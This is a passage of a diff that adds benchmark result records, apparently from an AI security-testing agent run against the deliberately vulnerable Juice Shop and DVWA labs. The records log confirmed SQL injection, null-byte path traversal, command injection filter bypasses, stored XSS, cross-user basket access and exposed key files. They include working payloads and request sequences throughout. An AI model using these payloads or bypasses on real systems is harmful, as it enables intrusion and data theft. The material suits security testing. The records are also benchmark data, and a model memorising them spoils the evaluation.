+    "cwe": "CWE-89",
+    "title": "SQL Injection in Product Search Endpoint (Error-based + UNION-based)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/rest/products/search?q=qwert%27",
+      "GET http://juiceshop:3000/rest/products/search?q=x%27%29%29+UNION+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9--"
+    ],
+    "response_evidence": "1) A single quote payload (q=qwert') triggered HTTP 500 with body: \\\"Error: SQLITE_ERROR: near \\\\\\\"'%'\\\\\\\": syntax error\\\" (visible_text: \\\"Error: SQLITE_ERROR: near \\\\\\\"'%'\\\\\\\": syntax error OWASP Juice Shop (Express ^4.17.1) 500 Error: SQLITE_ERROR: near \\\\\\\"'%'\\\\\\\": syntax error\\\"), proving the q parameter is concatenated unsanitized into a raw SQL query. 2) A crafted UNION payload (q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--) returned HTTP 200 with body: {\\\"status\\\":\\\"success\\\",\\\"data\\\":[{\\\"id\\\":1,\\\"name\\\":2,\\\"description\\\":3,\\\"price\\\":4,\\\"deluxePrice\\\":5,\\\"image\\\":6,\\\"createdAt\\\":7,\\\"updatedAt\\\":8,\\\"deletedAt\\\":9}]}, demonstrating successful injection of a 9-column UNION SELECT that closes the original WHERE clause and returns attacker-controlled literal values mapped onto the product schema — confirming full SQL injection with UNION-based data exfiltration capability.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0027",
+    "target": "juiceshop",
+    "endpoint_url": "/ftp/package.json.bak%2500.md",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-22",
+    "title": "Poison Null-Byte Path Traversal Bypasses File-Extension Filter on /ftp/ (package.json.bak)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/ftp/package.json.bak (unauth)",
+      "GET http://juiceshop:3000/ftp/package.json.bak%2500.md (unauth)"
+    ],
+    "response_evidence": "1) GET /ftp/package.json.bak returned HTTP 403 with body: 'Error: Only .md and .pdf files are allowed! ... at verify (/juice-shop/build/routes/fileServer.js:55:18)' confirming the extension-allowlist filter blocks direct .bak access.\n2) GET /ftp/package.json.bak%2500.md (URL-encoded null byte + allowed .md extension appended) returned HTTP 200, content-type application/octet-stream, with full contents of the restricted package.json backup file, e.g.: '{\\n  \"name\": \"juice-shop\",\\n  \"version\": \"6.2.0-SNAPSHOT\", ... \"dependencies\": {...}, \"devDependencies\": {...} ...'. This demonstrates the filter inspects only the trailing .md string while the underlying filesystem call truncates the path at the null byte, serving the original package.json.bak content — a confirmed poison null-byte path traversal filter bypass.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0028",
+    "target": "juiceshop",
+    "endpoint_url": "/ftp/package.json.bak%2500.md",
+    "method": "GET",
+    "parameter": "path (poison null byte)",
+    "cwe": "CWE-22",
+    "title": "Poison Null-Byte Extension Filter Bypass Grants Access to Restricted .bak File",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/ftp/package.json.bak HTTP/1.1",
+      "GET http://juiceshop:3000/ftp/package.json.bak%2500.md HTTP/1.1"
+    ],
+    "response_evidence": "Step1 (baseline): GET /ftp/package.json.bak returned HTTP 403 with body 'Error: Only .md and .pdf files are allowed!' and stack trace referencing fileServer.js verify() extension filter — confirms the .bak extension is blocked by the server-side filter.\nStep2 (bypass): GET /ftp/package.json.bak%2500.md (URL-encoded null byte '%2500' decodes to %00 + '.md') returned HTTP 200, content-type application/octet-stream, with full package.json file content: '{\\\"name\\\": \\\"juice-shop\\\", \\\"version\\\": \\\"6.2.0-SNAPSHOT\\\", \\\"description\\\": \\\"An intentionally insecure JavaScript Web Application\\\", ... \\\"dependencies\\\": {...}, \\\"devDependencies\\\": {...}}'. The filter saw the appended .md extension and allowed the request, while the underlying filesystem read truncated the path at the null byte, serving the restricted package.json.bak file. This behavioral contrast (403 vs 200-with-real-restricted-content) confirms the poison null-byte path traversal/extension-filter bypass.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0029",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection via pipe bypass in ip POST field (DVWA Command Injection, medium security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/exec/  form_data={ip: '127.0.0.1| whoami', Submit: 'Submit'}  [security=medium]"
+    ],
+    "response_evidence": "[security=medium] Confirmed OS command injection bypassing the ';' and '&&' blacklist by using a bare pipe character. Payload ip=127.0.0.1| whoami was submitted and the response pre_block contained exactly \"www-data\" -- the web server process identity -- appended after the ping output section, confirming arbitrary command execution on the host. Response visible_text: \"Vulnerability: Command Injection ... Enter an IP address: www-data\". Session confirmed at security_level=medium via session_info field in the response.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0030",
+    "target": "dvwa",
+    "endpoint_url": "/vulnerabilities/sqli/session-input.php",
+    "method": "POST",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection via out-of-band session id (session-input.php) with trailing comment bypasses LIMIT 1 at high security",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/sqli/session-input.php (session=dvwa_admin) form_data={id: \"1' OR '1'='1' #\", Submit: 'Submit'}",
+      "GET http://dvwa/vulnerabilities/sqli/ (session=dvwa_admin)  -> TRUE case render",
+      "POST http://dvwa/vulnerabilities/sqli/session-input.php (session=dvwa_admin) form_data={id: \"1' AND '1'='2' #\", Submit: 'Submit'}",
+      "GET http://dvwa/vulnerabilities/sqli/ (session=dvwa_admin) -> FALSE case render"
+    ],
+    "response_evidence": "[security=high] Footer on all responses confirms 'Security Level: high'. TRUE payload id=1' OR '1'='1' # stored via session-input.php, then GET /vulnerabilities/sqli/ rendered 5 seeded user records in pre_blocks: \\\"ID: 1' OR '1'='1' # / First name: admin / Surname: admin\\\", \\\"... First name: Gordon / Surname: Brown\\\", \\\"... First name: Hack / Surname: Me\\\", \\\"... First name: Pablo / Surname: Picasso\\\", \\\"... First name: Bob / Surname: Smith\\\" — i.e. the injected OR '1'='1' combined with trailing '#' comment successfully neutralized the appended 'LIMIT 1' clause and returned all rows instead of just one. FALSE payload id=1' AND '1'='2' # produced a page with empty pre_blocks / no ID-First name-Surname records at all (visible_text shows only 'Click here to change your ID .' with no result rows), confirming zero records returned. The clear TRUE(5 rows)/FALSE(0 rows) differential proves boolean-based SQL injection survives the high-security filtering (addslashes-style escaping) because the trailing '#' comments out the appended LIMIT clause.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0031",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/encryptionkeys/jwt.pub",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-548",
+    "title": "Exposed Encryption Key File - jwt.pub (JWT RSA public key) readable without authentication",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/encryptionkeys/jwt.pub (session=unauth, no Authorization header)"
+    ],
+    "response_evidence": "HTTP 200, Content-Type: application/x-mspublisher. Body content is a valid PEM-formatted RSA public key:\\n-----BEGIN RSA PUBLIC KEY-----\\nMIGJAoGBAM3CosR73CBNcJsLv5E90NsFt6qN1uziQ484gbOoule8leXHFbyIzPQRozgEpSpiwhr6d2/c0CfZHEJ3m5tV0klxfjfM7oqjRMURnH/rmBjcETQ7qzIISZQ/iptJ3p7Gi78X5ZMhLNtDkUFU9WaGdiEb+SnC39wjErmJSfmGb7i1AgMBAAE=\\n-----END RSA PUBLIC KEY-----\\nThis is the public key used to verify JWT signatures issued by the application, exposed via an unauthenticated, unrestricted static directory. Confirms CWE-548, supplementing the prior /encryptionkeys/ directory listing finding by proving the listed jwt.pub file content is directly retrievable.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0032",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/ftp/",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-200",
+    "title": "Open Directory Listing Exposes Confidential Acquisitions Memo via /ftp/",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/ftp/ HTTP/1.1\nAccept: text/html,application/json\n(unauthenticated session)",
+      "GET http://juiceshop:3000/ftp/acquisitions.md HTTP/1.1\n(unauthenticated session)"
+    ],
+    "response_evidence": "Step 1: GET /ftp/ returned HTTP 200 with a browsable directory listing (content_type text/html) enumerating files including quarantine/, acquisitions.md (909 bytes), announcement_encrypted.md, coupons_2013.md.bak, eastere.gg, encrypt.pyc, incident-support.kdbx, legal.md, package.json.bak, suspicious_errors.yml — all directly hyperlinked (e.g. http://juiceshop:3000/ftp/acquisitions.md).\n\nStep 2: GET /ftp/acquisitions.md returned HTTP 200, content_type text/markdown, with body containing the confidential memo text:\n\\\"# Planned Acquisitions\\n\\n> This document is confidential! Do not distribute!\\n\\nOur company plans to acquire several competitors within the next year.\\nThis will have a significant stock market impact as we will elaborate in detail in the following paragraph: ... Our shareholders will be excited. It's true. No fake news.\\\"\n\nThis matches the benchmark criteria: directory listing is browsable AND reveals acquisitions.md, and direct retrieval of that file discloses the confidential acquisition memo content verbatim, confirming unauthorized exposure of sensitive business information with no authentication required.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0033",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/encryptionkeys/",
+    "method": "GET",
+    "parameter": "N/A (directory listing)",
+    "cwe": "CWE-548",
+    "title": "Exposed Encryption-Keys Directory Listing at /encryptionkeys/",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/encryptionkeys/ (session=unauth, Accept: text/html,application/json) -> HTTP 200"
+    ],
+    "response_evidence": "HTTP 200 response from unauthenticated GET /encryptionkeys/ rendered a serve-index style directory listing. Extracted visible_text: 'listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM'. The listing exposes direct links to http://juiceshop:3000/encryptionkeys/jwt.pub and http://juiceshop:3000/encryptionkeys/premium.key, both sensitive cryptographic key material files, confirming the directory is browsable and discloses sensitive key files without authentication, matching the CWE-548 criteria (browsable listing + exposure of premium.key and jwt.pub).",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0034",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/?id=",
+    "method": "GET",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection via unsanitized 'id' parameter in DVWA SQLi page (security=low)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/security.php (verified security_level=low via session_info)",
+      "GET http://dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit",
+      "GET http://dvwa/vulnerabilities/sqli/?id=1%27+AND+%271%27%3D%272&Submit=Submit"
+    ],
+    "response_evidence": "[security=low] TRUE payload id=1' OR '1'='1 returned 5 user records bypassing the single-record WHERE clause: 'ID: 1' OR '1'='1 First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE payload id=1' AND '1'='2 returned zero records (page showed only the static 'User ID:' prompt with no pre_blocks/result rows). This confirms the id parameter is concatenated unsanitized into the SQL query, enabling boolean-based SQL injection.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0035",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/rest/basket/6",
+    "method": "GET",
+    "parameter": "id (path)",
+    "cwe": "CWE-639",
+    "title": "Cross-User Basket Access (BOLA) - acct2 can read acct1's basket",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET /rest/basket/6 with juiceshop_acct1 Bearer token -> 200, basket id=6, UserId=22, Product 'Apple Juice (1000ml)' qty=3 (confirms own_basket_id=6 for acct1)",
+      "GET /rest/basket/6 with juiceshop_acct2 Bearer token -> 200, returns IDENTICAL basket id=6, UserId=22, Product 'Apple Juice (1000ml)' qty=3 -- acct2's own basket id is 7, yet it retrieved acct1's basket without any ownership check"
+    ],
+    "response_evidence": "acct1 request confirms basket 6 belongs to UserId 22 with BasketItem: ProductId 1, name 'Apple Juice (1000ml)', quantity=3. The acct2 request (session_info.own_basket_id=7, email acct2_bench@juiceshop.local) to the SAME endpoint /rest/basket/6 returned HTTP 200 with body identical to acct1's: {\\\"id\\\":6,\\\"UserId\\\":22,...\\\"name\\\":\\\"Apple Juice (1000ml)\\\"...\\\"quantity\\\":3}. No 403/401 was returned and no ownership filtering was applied server-side, proving acct2 can access acct1's private basket contents (BOLA / CWE-639).",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0036",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/xss_s/",
+    "method": "POST",
+    "parameter": "mtxMessage",
+    "cwe": "CWE-79",
+    "title": "Stored XSS in guestbook mtxMessage field [security=low]",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/xss_s/ form_data={txtName: 'tester', mtxMessage: '<script id=\\\"test_token\\\">window.xss_flag=1</script>', btnSign: 'Sign Guestbook'} (session=dvwa_admin, security=low) -- bypassed client-side maxlength=50 restriction by submitting raw form POST",
+      "browser_navigate http://dvwa/vulnerabilities/xss_s/ (session=dvwa_admin)",
+      "browser_eval_js('window.xss_flag')"
+    ],
+    "response_evidence": "[security=low] After stored submission, guestbook listing showed new entry 'Name: tester Message:' with the message body rendered blank in extracted visible_text (because the injected <script> tag content is not text, confirming it was stored as raw unescaped HTML rather than displayed literally as text, unlike the benign seeded entry 'This is a test comment.' which displayed as plain text). Server returned HTTP 200 and did not encode/strip the tag.",
+    "browser_js_evidence": "browser_eval_js(\"window.xss_flag\") on authenticated dvwa_admin session at http://dvwa/vulnerabilities/xss_s/ returned result: 1, proving the injected <script id=\"test_token\">window.xss_flag=1</script> payload executed in the DOM upon page render, confirming stored XSS."
+  },
+  {
+    "blind_id": "BLIND-0037",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection via ip parameter using no-trailing-space pipe (DVWA high security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/exec/  body: ip=127.0.0.1|whoami & Submit=Submit"
+    ],
+    "response_evidence": "[security=high] Footer explicitly shows 'Security Level: high'. Payload ip=127.0.0.1|whoami (pipe with NO trailing space, bypassing the high-level blacklist of '; ', '| ' with space, and '&&') was submitted to POST /vulnerabilities/exec/. The rendered response's pre_blocks contained exactly: \"www-data\" — the identity of the web server process — directly below the ping output, confirming successful execution of the injected 'whoami' command appended via the pipe operator.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0038",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/rest/products/search",
+    "method": "GET",
+    "parameter": "q",
+    "cwe": "CWE-89",
+    "title": "Product-Search SQL Injection via unsanitized 'q' parameter",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET /rest/products/search?q=qwert' ",
+      "GET /rest/products/search?q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--"
+    ],
+    "response_evidence": "Request 1 (single quote payload q=qwert') returned HTTP 500 with body: 'Error: SQLITE_ERROR: near \\\"'%'\\\": syntax error' — confirming the raw input is concatenated unsanitized into a SQL LIKE query, producing a database error disclosure. Request 2 (9-column UNION payload q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--) returned HTTP 200 with JSON body: {\\\"status\\\":\\\"success\\\",\\\"data\\\":[{\\\"id\\\":1,\\\"name\\\":2,\\\"description\\\":3,\\\"price\\\":4,\\\"deluxePrice\\\":5,\\\"image\\\":6,\\\"createdAt\\\":7,\\\"updatedAt\\\":8,\\\"deletedAt\\\":9}]} — the literal integers 1-9 returned as record fields prove the UNION SELECT was successfully injected and executed by the backend query, confirming SQL injection in the q parameter.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0039",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/encryptionkeys/",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-548",
+    "title": "Exposed Encryption-Keys Directory Listing at /encryptionkeys/",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/encryptionkeys/ HTTP/1.1\nAccept: text/html,application/json\n(unauth session, no Authorization header)"
+    ],
+    "response_evidence": "HTTP 200, content-type text/html; charset=utf-8. Response body is a browsable directory index titled 'listing directory /encryptionkeys/' containing the following entries:\\n- \\\"jwt.pub 248 12/19/2023 1:12:12 PM\\\"\\n- \\\"premium.key 50 12/19/2023 1:12:12 PM\\\"\\nBoth filenames are rendered as direct hyperlinks (http://juiceshop:3000/encryptionkeys/jwt.pub and http://juiceshop:3000/encryptionkeys/premium.key) in the directory listing, confirming the encryption keys directory is openly browsable without authentication and exposes sensitive key material filenames (JWT public key and premium feature key).",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0040",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/ftp/coupons_2013.md.bak",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-22",
+    "title": "Duplicate — Poison Null-Byte Path Traversal (coupons_2013.md.bak), already covered by package.json.bak finding",
+    "agent_verdict": "rejected",
+    "request_sequence": [
+      "GET http://juiceshop:3000/ftp/coupons_2013.md.bak (session=unauth) -> HTTP 403 'Only .md and .pdf files are allowed!'",
+      "GET http://juiceshop:3000/ftp/coupons_2013.md.bak%2500.md (session=unauth) -> HTTP 200, content-type application/octet-stream, body appears to be binary/encrypted coupon data (non-human-readable bytes e.g. 'n<MibgC7sn...')"
+    ],
+    "response_evidence": "Behavior reproduces the identical null-byte bypass vulnerability class already confirmed for /ftp/package.json.bak%2500.md: direct .bak request returns HTTP 403 (filter blocks .bak extension), while appending the URL-encoded null byte + .md extension (%2500.md) bypasses the filter and returns HTTP 200 with the underlying restricted file content. Since this is the same root-cause vulnerability (fileServer.js extension-check bypass via poison null byte) already confirmed as a finding on package.json.bak, this instance is marked rejected/duplicate rather than filed as a new distinct finding, per coordinator instruction. Note: retrieved content for coupons_2013.md.bak is binary/non-markdown (appears pre-encrypted or binary coupon data), consistent with it being a legacy .bak artifact, but the traversal mechanism and impact are identical to the already-confirmed instance.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0041",
+    "target": "juiceshop",
+    "endpoint_url": "/encryptionkeys/",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-548",
+    "title": "Exposed Encryption-Keys Directory listing discloses premium.key and jwt.pub",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/encryptionkeys/ HTTP/1.1  Accept: text/html,application/json",
+      "GET http://juiceshop:3000/encryptionkeys/premium.key HTTP/1.1"
+    ],
+    "response_evidence": "1) GET /encryptionkeys/ returned HTTP 200 with a serve-index directory listing (visible_text): 'listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM', confirming the directory is browsable without authentication and exposes both sensitive key files.\n2) GET /encryptionkeys/premium.key returned HTTP 200, content-type application/octet-stream, with body content: '1337133713371337.EA99A61D92D2955B1E9285B55BF2AD42', confirming the key file content is directly served to unauthenticated users.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0042",
+    "target": "dvwa",
+    "endpoint_url": "/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection via ip parameter using pipe without trailing space (DVWA high security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/exec/  body: ip=127.0.0.1|whoami & Submit=Submit  (session=dvwa_admin)"
+    ],
+    "response_evidence": "[security=high] Page footer confirms 'Security Level: high'. Payload `127.0.0.1|whoami` (pipe with NO trailing space, bypassing the high-security blacklist of '; ', '| ' (pipe+space), and '&&') was submitted to the ip field. Response pre_blocks contained the literal output \"www-data\", i.e. the web server process identity returned by the injected `whoami` command, proving unsanitized command execution on the host.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0043",
+    "target": "juiceshop",
+    "endpoint_url": "/rest/products/search",
+    "method": "GET",
+    "parameter": "q",
+    "cwe": "CWE-89",
+    "title": "SQL Injection in Product Search Query Parameter (Error-based + UNION-based)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/rest/products/search?q=qwert%27",
+      "GET http://juiceshop:3000/rest/products/search?q=x%27%29%29+UNION+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9--"
+    ],
+    "response_evidence": "Request 1 (q=qwert'): HTTP 500 with body containing 'Error: SQLITE_ERROR: near \\\"'%'\\\": syntax error', proving the raw input is concatenated unsanitized into the backend SQL query causing a database-level syntax error. Request 2 (q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--): HTTP 200 with body {\\\"status\\\":\\\"success\\\",\\\"data\\\":[{\\\"id\\\":1,\\\"name\\\":2,\\\"description\\\":3,\\\"price\\\":4,\\\"deluxePrice\\\":5,\\\"image\\\":6,\\\"createdAt\\\":7,\\\"updatedAt\\\":8,\\\"deletedAt\\\":9}]} — the literal integers 1-9 returned as field values (name=2, description=3, etc.) demonstrate successful injection of a 9-column UNION SELECT, confirming full control over the query structure and column count alignment.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0044",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection via pipe bypass in Command Injection (ping) form (medium security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/security.php  body=security=medium&seclev_submit=Submit&user_token=[REDACTED]  (set security level to medium)",
+      "POST http://dvwa/vulnerabilities/exec/  body=ip=127.0.0.1| whoami&Submit=Submit"
+    ],
+    "response_evidence": "[security=medium] Page footer confirms 'Security Level: medium'. Submitting ip=127.0.0.1| whoami (pipe character, which bypasses the medium-level blacklist that only filters literal ';' and '&&' substrings) produced a response whose output block (<pre>) contained exactly 'www-data' — the web server process identity — appended after the (suppressed/empty) ping output, confirming the injected whoami command executed server-side on the medium security level.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0045",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/api/Feedbacks",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-359",
+    "title": "Unauthenticated User-Feedback PII Exposure via /api/Feedbacks",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/api/Feedbacks (session=unauth, no Authorization header)"
+    ],
+    "response_evidence": "HTTP 200 JSON array returned with no authentication required. Example records include partially-masked author email addresses embedded directly in the publicly-readable comment text field, linked to a UserId: {\\\"UserId\\\":1,\\\"id\\\":1,\\\"comment\\\":\\\"I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)\\\",\\\"rating\\\":5, ...} and {\\\"UserId\\\":3,\\\"id\\\":3,\\\"comment\\\":\\\"Nothing useful available here! (***der@juice-sh.op)\\\",\\\"rating\\\":1, ...} and {\\\"UserId\\\":21,\\\"id\\\":4,\\\"comment\\\":\\\"...\\\\\\\"purpose betray marriage blame crunch monitor spin slide donate sport lift clutch\\\\\\\" (***ereum@juice-sh.op)\\\",...}. These records expose the author's email domain and partial local-part plus an internal UserId reference without requiring any authentication, constituting PII exposure (CWE-359) to anonymous/unauthenticated clients. No Authorization header was sent and the request still succeeded with HTTP 200, confirming lack of access control on PII-bearing feedback data.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0046",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/ (id set via POST /vulnerabilities/sqli/session-input.php)",
+    "method": "POST",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection via out-of-band session id input at DVWA high security",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "[security=high] POST http://dvwa/vulnerabilities/sqli/session-input.php  form_data={id: \"1' OR '1'='1' #\", Submit: Submit}  (session=dvwa_admin)",
+      "GET http://dvwa/vulnerabilities/sqli/  (session=dvwa_admin) -> TRUE case",
+      "[security=high] POST http://dvwa/vulnerabilities/sqli/session-input.php  form_data={id: \"1' AND '1'='2' #\", Submit: Submit}  (session=dvwa_admin)",
+      "GET http://dvwa/vulnerabilities/sqli/  (session=dvwa_admin) -> FALSE case"
+    ],
+    "response_evidence": "[security=high] Page footer confirms 'Security Level: high' on every response. TRUE payload 1' OR '1'='1' # set via session-input.php, then GET /vulnerabilities/sqli/ returned 5 full records: (admin/admin), (Gordon/Brown), (Hack/Me), (Pablo/Picasso), (Bob/Smith) -- i.e. ALL seeded users dumped, proving the quote-based injection with trailing comment bypasses the appended LIMIT 1 clause. FALSE payload 1' AND '1'='2' # set via session-input.php, then GET /vulnerabilities/sqli/ returned zero <pre> record blocks (page showed only the 'Click here to change your ID' link, no First name/Surname output). This TRUE(multiple rows)/FALSE(zero rows) differential with injected SQL syntax (quote breakout + comment) confirms classic SQL injection at DVWA high security, where id is only accepted out-of-band via session-input.php rather than the GET query string.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0047",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection in ip parameter of Ping utility [security=low]",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/exec/ form_data={ip: '127.0.0.1; whoami', Submit: 'Submit'} (session=dvwa_admin, security=low)"
+    ],
+    "response_evidence": "[security=low] Response body included normal ping output (PING 127.0.0.1 ... 4 packets transmitted, 4 received, 0% packet loss) followed immediately by the literal string 'www-data' on its own line, which is the web server process identity returned by the injected ';whoami' command appended via shell metacharacter ';'. This confirms unsanitized command injection in the ip field.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0048",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/xss_s/",
+    "method": "POST",
+    "parameter": "mtxMessage",
+    "cwe": "CWE-79",
+    "title": "DVWA Stored XSS via unsanitized guestbook 'mtxMessage' field [security=low]",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/xss_s/ (dvwa_admin, security=low) body: txtName=test&mtxMessage=<script id=\"test_token\">window.xss_flag=1</script>&btnSign=Sign Guestbook  -- raw POST bypassed client-side HTML maxlength=50 restriction (payload is 54 chars) since maxlength is only enforced client-sid",
+      "browser_navigate http://dvwa/vulnerabilities/xss_s/ (dvwa_admin session)",
+      "browser_eval_js('window.xss_flag')",
+      "browser_read_dom('#test_token')"
+    ],
+    "response_evidence": "[security=low] POST returned 200 and the stored guestbook now shows a new 'Name: test' entry (message rendered empty in plain-text extraction because the injected <script> tag content is not text-node visible, consistent with script execution rather than text display). Upon loading the page in an authenticated browser context, the injected script tag was found live in the DOM.",
+    "browser_js_evidence": "browser_eval_js(\\\"window.xss_flag\\\") returned result: 1. browser_read_dom(\\\"#test_token\\\") returned inner_text/inner_html_excerpt: \\\"window.xss_flag=1\\\", confirming the injected <script id=\\\"test_token\\\">window.xss_flag=1</script> payload was stored unsanitized and executed in the victim's browser context when the stored guestbook page was rendered, setting window.xss_flag=1."
+  },
+  {
+    "blind_id": "BLIND-0049",
+    "target": "dvwa",
+    "endpoint_url": "/vulnerabilities/sqli/",
+    "method": "GET",
+    "parameter": "id (set out-of-band via session-input.php)",
+    "cwe": "CWE-89",
+    "title": "SQL Injection results rendering on /vulnerabilities/sqli/ reflects out-of-band session-input.php injection at high security",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/sqli/session-input.php (session=dvwa_admin) form_data={id: \"1' OR '1'='1' #\", Submit: 'Submit'}",
+      "GET http://dvwa/vulnerabilities/sqli/ (session=dvwa_admin)",
+      "POST http://dvwa/vulnerabilities/sqli/session-input.php (session=dvwa_admin) form_data={id: \"1' AND '1'='2' #\", Submit: 'Submit'}",
+      "GET http://dvwa/vulnerabilities/sqli/ (session=dvwa_admin)"
+    ],
+    "response_evidence": "[security=high] Confirmed combined flow: at high security, GET /vulnerabilities/sqli/ has no local id input (forms:[]) and relies entirely on the id value previously POSTed to session-input.php. After TRUE payload, GET returned 5 full user records (admin/admin, Gordon/Brown, Hack/Me, Pablo/Picasso, Bob/Smith) in pre_blocks. After FALSE payload, GET returned zero records. This confirms the GET endpoint is vulnerable as part of the out-of-band SQLi flow at high security — same vulnerability chain as the session-input.php finding.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0050",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection via unsanitized 'ip' parameter in DVWA Ping tool [security=low]",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
